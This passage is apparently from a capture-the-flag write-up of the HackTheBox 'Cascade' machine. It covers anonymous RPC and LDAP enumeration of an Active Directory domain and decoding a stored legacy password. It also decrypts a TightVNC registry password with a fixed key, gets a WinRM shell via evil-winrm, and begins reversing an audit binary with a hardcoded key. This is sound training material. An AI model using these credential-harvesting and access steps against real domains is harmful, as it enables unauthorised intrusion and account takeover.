Service Info: Host: CASC-DC1<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
<span class="p">|</span>_clock-skew: 1s
<span class="p">|</span> smb2-security-mode:
<span class="p">|</span>   2.02:
<span class="p">|</span>_    Message signing enabled and required
<span class="p">|</span> smb2-time:
<span class="p">|</span>   date: 2020-06-03T00:21:02
<span class="p">|</span>_  start_date: 2020-06-02T04:24:21
</code></pre></div><p><code>nmap</code> discovers the domain name of Cascade and also identifies the OS version.</p>
<p>I&rsquo;ll take notes on these:</p>
<ul>
<li>Domain: <code>cascade.local</code></li>
<li>Host: Windows Server 2008 R2 SP1</li>
</ul>
<p>The full scan almost returns the same result, except it discovers a WinRM port (5985).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «nmap» «192.168.43.234»
$ nmap -p- -oA nmap/full-cascade cascade.htb

PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49165/tcp open  unknown
</code></pre></div><blockquote>
<p>I&rsquo;ve added <code>10.10.10.182 cascade.htb</code> to my <code>/etc/hosts</code></p>
</blockquote>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-445---smb--rpc-over-smb">TCP 445 - SMB / RPC over SMB</h3>
<p>Anonymous login is allowed on SMB port. I tried to list all the shares using <code>smbclient</code> but there was nothing there.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «nmap» «192.168.43.234»
$ smbclient -N -L //10.10.10.182
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available
</code></pre></div><h4 id="enumeration-via-rpc">Enumeration via RPC</h4>
<p>Knowing anonymous login is allowed on SMB, I can try it too on RPC using <code>rpcclient</code> and it works as well.</p>
<p>With current access, I can obtain the domain users and their groups manually.</p>
<p>User enumeration</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «nmap» «192.168.43.234»
$ rpcclient -U <span class="s1">&#39;%&#39;</span> 10.10.10.182
rpcclient $&gt;
rpcclient $&gt; enumdomusers
user:<span class="o">[</span>CascGuest<span class="o">]</span> rid:<span class="o">[</span>0x1f5<span class="o">]</span>
user:<span class="o">[</span>arksvc<span class="o">]</span> rid:<span class="o">[</span>0x452<span class="o">]</span>
user:<span class="o">[</span>s.smith<span class="o">]</span> rid:<span class="o">[</span>0x453<span class="o">]</span>
user:<span class="o">[</span>r.thompson<span class="o">]</span> rid:<span class="o">[</span>0x455<span class="o">]</span>
user:<span class="o">[</span>util<span class="o">]</span> rid:<span class="o">[</span>0x457<span class="o">]</span>
user:<span class="o">[</span>j.wakefield<span class="o">]</span> rid:<span class="o">[</span>0x45c<span class="o">]</span>
user:<span class="o">[</span>s.hickson<span class="o">]</span> rid:<span class="o">[</span>0x461<span class="o">]</span>
user:<span class="o">[</span>j.goodhand<span class="o">]</span> rid:<span class="o">[</span>0x462<span class="o">]</span>
user:<span class="o">[</span>a.turnbull<span class="o">]</span> rid:<span class="o">[</span>0x464<span class="o">]</span>
user:<span class="o">[</span>e.crowe<span class="o">]</span> rid:<span class="o">[</span>0x467<span class="o">]</span>
user:<span class="o">[</span>b.hanson<span class="o">]</span> rid:<span class="o">[</span>0x468<span class="o">]</span>
user:<span class="o">[</span>d.burman<span class="o">]</span> rid:<span class="o">[</span>0x469<span class="o">]</span>
user:<span class="o">[</span>BackupSvc<span class="o">]</span> rid:<span class="o">[</span>0x46a<span class="o">]</span>
user:<span class="o">[</span>j.allen<span class="o">]</span> rid:<span class="o">[</span>0x46e<span class="o">]</span>
user:<span class="o">[</span>i.croft<span class="o">]</span> rid:<span class="o">[</span>0x46f<span class="o">]</span>
</code></pre></div><p>I&rsquo;ll save the output to a file called <code>users</code>, and filter the usernames only then pipe it to <code>users.list</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «cascade» «192.168.43.234»
$ cat users <span class="p">|</span> tr -d <span class="s1">&#39;[]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39; &#39;</span> -f1 <span class="p">|</span> cut -c6- <span class="p">|</span> tee users.list
CascGuest
arksvc
s.smith
r.thompson
util
j.wakefield
s.hickson
j.goodhand
a.turnbull
e.crowe
b.hanson
d.burman
BackupSvc
j.allen
i.croft
</code></pre></div><p>Builtin group enumeration</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">rpcclient $&gt; enumalsgroups <span class="nb">builtin</span>
group:<span class="o">[</span>Pre-Windows <span class="m">2000</span> Compatible Access<span class="o">]</span> rid:<span class="o">[</span>0x22a<span class="o">]</span>
group:<span class="o">[</span>Incoming Forest Trust Builders<span class="o">]</span> rid:<span class="o">[</span>0x22d<span class="o">]</span>
group:<span class="o">[</span>Windows Authorization Access Group<span class="o">]</span> rid:<span class="o">[</span>0x230<span class="o">]</span>
group:<span class="o">[</span>Terminal Server License Servers<span class="o">]</span> rid:<span class="o">[</span>0x231<span class="o">]</span>
group:<span class="o">[</span>Users<span class="o">]</span> rid:<span class="o">[</span>0x221<span class="o">]</span>
group:<span class="o">[</span>Guests<span class="o">]</span> rid:<span class="o">[</span>0x222<span class="o">]</span>
group:<span class="o">[</span>Remote Desktop Users<span class="o">]</span> rid:<span class="o">[</span>0x22b<span class="o">]</span>
group:<span class="o">[</span>Network Configuration Operators<span class="o">]</span> rid:<span class="o">[</span>0x22c<span class="o">]</span>
group:<span class="o">[</span>Performance Monitor Users<span class="o">]</span> rid:<span class="o">[</span>0x22e<span class="o">]</span>
group:<span class="o">[</span>Performance Log Users<span class="o">]</span> rid:<span class="o">[</span>0x22f<span class="o">]</span>
group:<span class="o">[</span>Distributed COM Users<span class="o">]</span> rid:<span class="o">[</span>0x232<span class="o">]</span>
group:<span class="o">[</span>IIS_IUSRS<span class="o">]</span> rid:<span class="o">[</span>0x238<span class="o">]</span>
group:<span class="o">[</span>Cryptographic Operators<span class="o">]</span> rid:<span class="o">[</span>0x239<span class="o">]</span>
group:<span class="o">[</span>Event Log Readers<span class="o">]</span> rid:<span class="o">[</span>0x23d<span class="o">]</span>
group:<span class="o">[</span>Certificate Service DCOM Access<span class="o">]</span> rid:<span class="o">[</span>0x23e<span class="o">]</span>
</code></pre></div><p>Domain group enumeration</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">rpcclient $&gt; enumalsgroups domain
group:<span class="o">[</span>Cert Publishers<span class="o">]</span> rid:<span class="o">[</span>0x205<span class="o">]</span>
group:<span class="o">[</span>RAS and IAS Servers<span class="o">]</span> rid:<span class="o">[</span>0x229<span class="o">]</span>
group:<span class="o">[</span>Allowed RODC Password Replication Group<span class="o">]</span> rid:<span class="o">[</span>0x23b<span class="o">]</span>
group:<span class="o">[</span>Denied RODC Password Replication Group<span class="o">]</span> rid:<span class="o">[</span>0x23c<span class="o">]</span>
group:<span class="o">[</span>DnsAdmins<span class="o">]</span> rid:<span class="o">[</span>0x44e<span class="o">]</span>
group:<span class="o">[</span>IT<span class="o">]</span> rid:<span class="o">[</span>0x459<span class="o">]</span>
group:<span class="o">[</span>Production<span class="o">]</span> rid:<span class="o">[</span>0x45a<span class="o">]</span>
group:<span class="o">[</span>HR<span class="o">]</span> rid:<span class="o">[</span>0x45b<span class="o">]</span>
group:<span class="o">[</span>AD Recycle Bin<span class="o">]</span> rid:<span class="o">[</span>0x45f<span class="o">]</span>
group:<span class="o">[</span>Backup<span class="o">]</span> rid:<span class="o">[</span>0x460<span class="o">]</span>
group:<span class="o">[</span>Temps<span class="o">]</span> rid:<span class="o">[</span>0x463<span class="o">]</span>
group:<span class="o">[</span>WinRMRemoteWMIUsers__<span class="o">]</span> rid:<span class="o">[</span>0x465<span class="o">]</span>
group:<span class="o">[</span>Remote Management Users<span class="o">]</span> rid:<span class="o">[</span>0x466<span class="o">]</span>
group:<span class="o">[</span>Factory<span class="o">]</span> rid:<span class="o">[</span>0x46c<span class="o">]</span>
group:<span class="o">[</span>Finance<span class="o">]</span> rid:<span class="o">[</span>0x46d<span class="o">]</span>
group:<span class="o">[</span>Audit Share<span class="o">]</span> rid:<span class="o">[</span>0x471<span class="o">]</span>
group:<span class="o">[</span>Data Share<span class="o">]</span> rid:<span class="o">[</span>0x472<span class="o">]</span>
</code></pre></div><p>List group members:</p>
<p>Members of IT group (rid:0x459)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">rpcclient $&gt; queryaliasmem domain 0x459
 sid:<span class="o">[</span>S-1–5–21–3332504370–1206983947–1165150453–1106<span class="o">]</span>
 sid:<span class="o">[</span>S-1–5–21–3332504370–1206983947–1165150453–1107<span class="o">]</span>
 sid:<span class="o">[</span>S-1–5–21–3332504370–1206983947–1165150453–1109<span class="o">]</span>
rpcclient $&gt; lookupsids S-1–5–21–3332504370–1206983947–1165150453–1106
S-1–5–21–3332504370–1206983947–1165150453–1106 CASCADE<span class="se">\a</span>rksvc <span class="o">(</span>1<span class="o">)</span>
rpcclient $&gt; lookupsids S-1–5–21–3332504370–1206983947–1165150453–1107
S-1–5–21–3332504370–1206983947–1165150453–1107 CASCADE<span class="se">\s</span>.smith <span class="o">(</span>1<span class="o">)</span>
rpcclient $&gt; lookupsids S-1–5–21–3332504370–1206983947–1165150453–1109
S-1–5–21–3332504370–1206983947–1165150453–1109 CASCADE<span class="se">\r</span>.thompson <span class="o">(</span>1<span class="o">)</span>
</code></pre></div><p>Members of Remote Management Users group (rid:0x466)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">rpcclient $&gt; queryaliasmem domain 0x466
 sid:<span class="o">[</span>S-1–5–21–3332504370–1206983947–1165150453–1106<span class="o">]</span>
 sid:<span class="o">[</span>S-1–5–21–3332504370–1206983947–1165150453–1107<span class="o">]</span>
rpcclient $&gt; lookupsids S-1–5–21–3332504370–1206983947–1165150453–1106
S-1–5–21–3332504370–1206983947–1165150453–1106 CASCADE<span class="se">\a</span>rksvc <span class="o">(</span>1<span class="o">)</span>
rpcclient $&gt; lookupsids S-1–5–21–3332504370–1206983947–1165150453–1107
S-1–5–21–3332504370–1206983947–1165150453–1107 CASCADE<span class="se">\s</span>.smith <span class="o">(</span>1<span class="o">)</span>
</code></pre></div><p>Member of AD Recycle Bin</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">rpcclient $&gt; queryaliasmem domain 0x45f
 sid:<span class="o">[</span>S-1–5–21–3332504370–1206983947–1165150453–1106<span class="o">]</span>
rpcclient $&gt; lookupsids S-1–5–21–3332504370–1206983947–1165150453–1106
S-1–5–21–3332504370–1206983947–1165150453–1106 CASCADE<span class="se">\a</span>rksvc <span class="o">(</span>1<span class="o">)</span>
</code></pre></div><p>Members of HR (rid:0x45b)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">rpcclient $&gt; queryaliasmem domain 0x45b
 sid:<span class="o">[</span>S-1–5–21–3332504370–1206983947–1165150453–1121<span class="o">]</span>
</code></pre></div><p>Members of Audit group (rid:0x471)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">rpcclient $&gt; queryaliasmem domain 0x471
 sid:<span class="o">[</span>S-1–5–21–3332504370–1206983947–1165150453–1107<span class="o">]</span>
rpcclient $&gt; lookupsids S-1–5–21–3332504370–1206983947–1165150453–1107
S-1–5–21–3332504370–1206983947–1165150453–1107 CASCADE<span class="se">\s</span>.smith <span class="o">(</span>1<span class="o">)</span>
</code></pre></div><p>Members of Data share group (rid:0x472)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">rpcclient $&gt; queryaliasmem domain 0x472
 sid:<span class="o">[</span>S-1–5–21–3332504370–1206983947–1165150453–513<span class="o">]</span>
rpcclient $&gt; lookupsids S-1–5–21–3332504370–1206983947–1165150453–513
S-1–5–21–3332504370–1206983947–1165150453–513 CASCADE<span class="se">\D</span>omain Users <span class="o">(</span>2<span class="o">)</span>
</code></pre></div><p>After enough digging, I did a password spray with a pattern of “username%username”, but no luck.</p>
<p>Before moving on, I&rsquo;ll note the Remote Management Users group members:</p>
<ul>
<li><code>arksvc</code></li>
<li><code>s.smith</code></li>
</ul>
<h3 id="tcp-389---ldap">TCP 389 - LDAP</h3>
<p>In LDAP, anonymous login are also allowed.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «cascade» «192.168.43.234»
$ ldapsearch -h <span class="s1">&#39;10.10.10.182&#39;</span> -x -b <span class="s2">&#34;dc=cascade,dc=local&#34;</span> &gt; ldap-enum
</code></pre></div><blockquote>
<p>Nmap already identifies the Active Directory domain name as <code>cascade.local</code>. Because AD is basically based on the LDAP protocol, in LDAP form or known as a distinguished name, the AD domain usually follows &ldquo;DC=NAME,DC=TLD&rdquo;.</p>
<ul>
<li>cascade = NAME</li>
<li>local = TLD (Top-Level Domain)</li>
</ul>
</blockquote>
<p>While examining the output from <code>ldap-enum</code>, I spotted an interesting line from user Ryan Thompson.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">...&lt;snip&gt;...
displayName: Ryan Thompson
uSNCreated: <span class="m">24610</span>
memberOf: <span class="nv">CN</span><span class="o">=</span>IT,OU<span class="o">=</span>Groups,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local</span>
uSNChanged: <span class="m">295010</span>
name: Ryan Thompson
...&lt;snip&gt;...
logonCount: <span class="m">2</span>
sAMAccountName: r.thompson
sAMAccountType: <span class="m">805306368</span>
userPrincipalName: r.thompson@cascade.local
objectCategory: <span class="nv">CN</span><span class="o">=</span>Person,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local</span>
...&lt;snip&gt;...
lastLogonTimestamp: <span class="m">132294360317419816</span>
msDS-SupportedEncryptionTypes: <span class="m">0</span>
cascadeLegacyPwd: <span class="nv">clk0bjVldmE</span><span class="o">=</span>
</code></pre></div><p>The <code>cascadeLegacyPwd: clk0bjVldmE=</code> line only appears on Ryan Thompson section and it can be decoded into <code>rY4n5eva</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «cascade» «192.168.43.234»
$ <span class="nb">echo</span> <span class="nv">clk0bjVldmE</span><span class="o">=</span> <span class="p">|</span> base64 -d
rY4n5eva
</code></pre></div><p>I&rsquo;ll mark the accounts that have a <code>logonCount</code> value greater than one:</p>
<p><div class="img-container"><img src="imgs/image-20210423204454321.png" alt="image-20210423204454321"  /></div>
</p>
<p><div class="img-container"><img src="imgs/image-20210423204536286.png" alt="image-20210423204536286"  /></div>
</p>
<h3 id="access-as-rthompson">Access as r.thompson</h3>
<p>It turns out that the decoded <code>cascadeLegacyPwd</code> is <code>r.thompson </code>&rsquo;s password.</p>
<p>With <code>r.thompson</code> creds, I can see all the available shares.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «cascade» «192.168.43.234»
$ crackmapexec smb cascade.htb -u r.thompson -p <span class="s1">&#39;rY4n5eva&#39;</span> --shares 
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210423204947026.png" alt="image-20210423204947026"  /></div>
</p>
<h4 id="data-share">Data share</h4>
<p>In Data shares, <code>r.thompson</code> is only allowed to read IT folder. I&rsquo;ll pull all the files from the IT folder using <code>smbget</code>.</p>
<blockquote>
<p>Recall enumeration via RPC, <code>r.thompson</code> is a member of the IT group.</p>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «cascade» «192.168.43.234»
$ smbget -R smb://cascade.htb/Data/IT/ -U r.thompson
</code></pre></div><p><img src="imgs/image-20210423205837847.png" alt="image-20210423205837847" style="zoom:80%;" /></p>
<p>Here is the directory structure. I&rsquo;ll take a look on <code>Meeting_Notes_June_2018.html</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «Data» «192.168.43.234»
$ tree
.
└── IT
    ├── Email Archives
    │   └── Meeting_Notes_June_2018.html
    ├── LogonAudit
    ├── Logs
    │   ├── Ark AD Recycle Bin
    │   │   └── ArkAdRecycleBin.log
    │   └── DCs
    │       └── dcdiag.log
    └── Temp
        ├── r.thompson
        └── s.smith
            └── VNC Install.reg

<span class="m">9</span> directories, <span class="m">4</span> files
</code></pre></div><p>I can read the <code>Meeting_Notes_June_2018.html</code>&rsquo;s content using browser. I drew a red line to indicate something important.</p>
<p><div class="img-container"><img src="imgs/image-20210423210730678.png" alt="image-20210423210730678"  /></div>
</p>
<p>The second interesting file is <code>VNC Install.reg</code>. It contains a stored password which can be decrypted according to this GitHub (<a href="https://github.com/frizb/PasswordDecrypts">https://github.com/frizb/PasswordDecrypts</a>)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">□□Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
...&lt;snip&gt;...
&#34;Password&#34;=hex:6b,cf,2a,4b,6e,5a,ca,0f
...&lt;snip&gt;...
</code></pre></div><p>The third interesting file is <code>ArkAdRecycleBin.log</code>. It looks like a log from a custom application. I&rsquo;ll take note on &ldquo;Moving object to AD recycle bin CN=TempAdmin&rdquo; part.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">1/10/2018 15:43 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
1/10/2018 15:43 [MAIN_THREAD]   Validating settings...
1/10/2018 15:43 [MAIN_THREAD]   Error: Access is denied
1/10/2018 15:43 [MAIN_THREAD]   Exiting with error code 5
2/10/2018 15:56 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
2/10/2018 15:56 [MAIN_THREAD]   Validating settings...
2/10/2018 15:56 [MAIN_THREAD]   Running as user CASCADE\ArkSvc
2/10/2018 15:56 [MAIN_THREAD]   Moving object to AD recycle bin CN=Test,OU=Users,OU=UK,DC=cascade,DC=local
2/10/2018 15:56 [MAIN_THREAD]   Successfully moved object. New location CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local
2/10/2018 15:56 [MAIN_THREAD]   Exiting with error code 0
8/12/2018 12:22 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
8/12/2018 12:22 [MAIN_THREAD]   Validating settings...
8/12/2018 12:22 [MAIN_THREAD]   Running as user CASCADE\ArkSvc
8/12/2018 12:22 [MAIN_THREAD]   Moving object to AD recycle bin CN=TempAdmin,OU=Users,OU=UK,DC=cascade,DC=local
8/12/2018 12:22 [MAIN_THREAD]   Successfully moved object. New location CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
8/12/2018 12:22 [MAIN_THREAD]   Exiting with error code 0
</code></pre></div><p>As for <code>dcdiag.log</code>, up until now, I had no idea what that log was about.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-ssmith">Shell as s.smith</h3>
<h4 id="decrypt-vnc-password">Decrypt VNC Password</h4>
<p>The VNC password can be decrypted using metasploit irb (interactive ruby).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «Data» «192.168.43.234»
$ msfconsole -q
msf6 &gt; irb
<span class="o">[</span>*<span class="o">]</span> Starting IRB shell...
<span class="o">[</span>*<span class="o">]</span> You are in the <span class="s2">&#34;framework&#34;</span> object

irb: warn: can<span class="s1">&#39;t alias jobs from irb_jobs.
</span><span class="s1">&gt;&gt; fixedkey = &#34;\x17\x52\x6b\x06\x23\x4e\x58\x07&#34;
</span><span class="s1">=&gt; &#34;\x17Rk\x06#NX\a&#34;
</span><span class="s1">&gt;&gt; require &#39;</span>rex/proto/rfb<span class="s1">&#39;
</span><span class="s1">=&gt; true
</span><span class="s1">&gt;&gt; Rex::Proto::RFB::Cipher.decrypt [&#34;6BCF2A4B6E5ACA0f&#34;].pack(&#39;</span>H*<span class="err">&#39;</span><span class="o">)</span>, <span class="nv">fixedkey</span>
<span class="o">=</span>&gt; <span class="s2">&#34;sT333ve2&#34;</span>
</code></pre></div><p>Since it was discovered in <code>s.smith</code>&rsquo;s folder, I will try this decrypted password on user <code>s.smith</code>.</p>
<h4 id="remote-access">Remote Access</h4>
<p>From RPC enumeration, I already knew that user <code>s.smith</code> is a member of Remote Management Users, so I could try it with <code>evil-winrm</code> and it works.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «Data» «192.168.43.234»
$ evil-winrm -i cascade.htb -u s.smith -p <span class="s1">&#39;sT333ve2&#39;</span>
</code></pre></div><p>I can grab user flag.</p>
<p><img src="imgs/image-20210423213702788.png" alt="image-20210423213702788" style="zoom:80%;" /></p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-arksvc">Shell as arksvc</h3>
<h4 id="audit-share">Audit$ share</h4>
<p>After enumerating <code>s.smith</code>&rsquo;s privileges and groups, <code>CASCADE\Audit Share</code> reminds me to the <code>Audit$</code> share, to which I previously had no access.</p>
<p><div class="img-container"><img src="imgs/image-20210423214229455.png" alt="image-20210423214229455"  /></div>
</p>
<p>I have read permissions now on <code>Audit$</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210423214742159.png" alt="image-20210423214742159"  /></div>
</p>
<p>This share appears to contain an entire software application.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «Data» «192.168.43.234»
$ smbclient -U s.smith <span class="se">\\\\</span>cascade.htb<span class="se">\\</span>Audit$
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210423214817145.png" alt="image-20210423214817145"  /></div>
</p>
<p>I&rsquo;ll pull them all from Cascade to my Kali</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «Data» «192.168.43.234»
$ smbget -R smb://cascade.htb/Audit$ -U s.smith
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210423215007263.png" alt="image-20210423215007263"  /></div>
</p>
<p>And then send them over to my Windows.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «Audit$» «192.168.43.234»
$ tree
.
├── CascAudit.exe
├── CascCrypto.dll
├── DB
│   └── Audit.db
├── RunAudit.bat
├── System.Data.SQLite.dll
├── System.Data.SQLite.EF6.dll
├── x64
│   └── SQLite.Interop.dll
└── x86
    └── SQLite.Interop.dll

<span class="m">3</span> directories, <span class="m">8</span> files

→ root@iamf «Audit$» «192.168.43.234»
$ file CascAudit.exe
CascAudit.exe: PE32 executable <span class="o">(</span>console<span class="o">)</span> Intel <span class="m">80386</span> Mono/.Net assembly, <span class="k">for</span> MS Windows
</code></pre></div><h4 id="analyzing-auditdb">Analyzing Audit.db</h4>
<p><code>Audit.db</code> is an SQlite3 database. As I&rsquo;m analyzing on my Windows without SQLite installed, I&rsquo;ll use an online <a href="https://inloop.github.io/sqlite-viewer/">SQLite viewer</a>.</p>
<p>There are four tables in the database.</p>
<p><img src="imgs/image-20210423222130834.png" alt="image-20210423222130834" style="zoom:80%;" /></p>
<p>The records of the deleted AD object are kept in the <code>DeletedUserAudit</code> table.</p>
<p><img src="imgs/image-20210423221127995.png" alt="image-20210423221127995" style="zoom:80%;" /></p>
<p>The <code>Ldap</code> table contains the credentials for ArkSvc.</p>
<p><img src="imgs/image-20210423222309586.png" alt="image-20210423222309586" style="zoom:80%;" /></p>
<p>The password is not a simple base64 encoded string, but it is encrypted.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «Audit$» «192.168.43.234»
$ <span class="nb">echo</span> <span class="s1">&#39;BQO5l5Kj9MdErXx6Q6AGOw==&#39;</span> <span class="p">|</span> base64 -d
♣♥□□□□□□D□<span class="p">|</span>zC□♠<span class="p">;</span><span class="c1">#</span>
</code></pre></div><h4 id="analyzing-cascauditexe">Analyzing CascAudit.exe</h4>
<p>I tried to run the program on my PC, but it produced the following errors.</p>
<p><div class="img-container"><img src="imgs/image-20210423223821767.png" alt="image-20210423223821767"  /></div>
</p>
<blockquote>
<p>Don&rsquo;t run an untrusted binary you downloaded from a CTF box.</p>
</blockquote>
<p>I use a tool called <code>dnSpy</code> to reverse CascAudit.exe.</p>
<p>Once it is loaded, I&rsquo;ll go straight to the main function.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="k">public</span> <span class="k">static</span> <span class="k">void</span> <span class="n">Main</span><span class="p">()</span>
<span class="p">{</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">MyProject</span><span class="p">.</span><span class="n">Application</span><span class="p">.</span><span class="n">CommandLineArgs</span><span class="p">.</span><span class="n">Count</span> <span class="p">!=</span> <span class="m">1</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;Invalid number of command line args specified. Must specify database path only&#34;</span><span class="p">);</span>
		<span class="k">return</span><span class="p">;</span>
	<span class="p">}</span>
    
<span class="p">...&lt;</span><span class="n">snip</span><span class="p">&gt;...</span>
<span class="k">try</span>
			<span class="p">{</span>
				<span class="n">sqliteConnection</span><span class="p">.</span><span class="n">Open</span><span class="p">();</span>
				<span class="k">using</span> <span class="p">(</span><span class="n">SQLiteCommand</span> <span class="n">sqliteCommand</span> <span class="p">=</span> <span class="k">new</span> <span class="n">SQLiteCommand</span><span class="p">(</span><span class="s">&#34;SELECT * FROM LDAP&#34;</span><span class="p">,</span> <span class="n">sqliteConnection</span><span class="p">))</span>
				<span class="p">{</span>
					<span class="k">using</span> <span class="p">(</span><span class="n">SQLiteDataReader</span> <span class="n">sqliteDataReader</span> <span class="p">=</span> <span class="n">sqliteCommand</span><span class="p">.</span><span class="n">ExecuteReader</span><span class="p">())</span>
					<span class="p">{</span>
						<span class="n">sqliteDataReader</span><span class="p">.</span><span class="n">Read</span><span class="p">();</span>
						<span class="n">str</span> <span class="p">=</span> <span class="n">Conversions</span><span class="p">.</span><span class="n">ToString</span><span class="p">(</span><span class="n">sqliteDataReader</span><span class="p">[</span><span class="s">&#34;Uname&#34;</span><span class="p">]);</span>
						<span class="n">str2</span> <span class="p">=</span> <span class="n">Conversions</span><span class="p">.</span><span class="n">ToString</span><span class="p">(</span><span class="n">sqliteDataReader</span><span class="p">[</span><span class="s">&#34;Domain&#34;</span><span class="p">]);</span>
						<span class="kt">string</span> <span class="n">encryptedString</span> <span class="p">=</span> <span class="n">Conversions</span><span class="p">.</span><span class="n">ToString</span><span class="p">(</span><span class="n">sqliteDataReader</span><span class="p">[</span><span class="s">&#34;Pwd&#34;</span><span class="p">]);</span>
						<span class="k">try</span>
						<span class="p">{</span>
							<span class="n">password</span> <span class="p">=</span> <span class="n">Crypto</span><span class="p">.</span><span class="n">DecryptString</span><span class="p">(</span><span class="n">encryptedString</span><span class="p">,</span> <span class="s">&#34;c4scadek3y654321&#34;</span><span class="p">);</span>
						<span class="p">}</span>
						<span class="k">catch</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">ex</span><span class="p">)</span>
						<span class="p">{</span>
							<span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;Error decrypting password: &#34;</span> <span class="p">+</span> <span class="n">ex</span><span class="p">.</span><span class="n">Message</span><span class="p">);</span>
							<span class="k">return</span><span class="p">;</span>
						<span class="p">}</span>
					<span class="p">}</span>
				<span class="p">}</span>
				<span class="n">sqliteConnection</span><span class="p">.</span><span class="n">Close</span><span class="p">();</span>
			<span class="p">}</span>
<span class="p">...&lt;</span><span class="n">snip</span><span class="p">&gt;...</span>
</code></pre></div><p>In order for the program to run properly, I need to specify the database path as its first argument.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="p">...&lt;</span><span class="n">snip</span><span class="p">&gt;...</span>
<span class="k">if</span> <span class="p">(</span><span class="n">MyProject</span><span class="p">.</span><span class="n">Application</span><span class="p">.</span><span class="n">CommandLineArgs</span><span class="p">.</span><span class="n">Count</span> <span class="p">!=</span> <span class="m">1</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;Invalid number of command line args specified. Must specify database path only&#34;</span><span class="p">);</span>
		<span class="k">return</span><span class="p">;</span>
	<span class="p">}</span>
<span class="p">...&lt;</span><span class="n">snip</span><span class="p">&gt;...</span>
</code></pre></div><p>If the condition above is satisfied, it opens an SQL connection and fetches all data from the <code>Ldap</code> table. Each of them is then stored into <code>str</code>, <code>str2</code>, and <code>password</code>.</p>
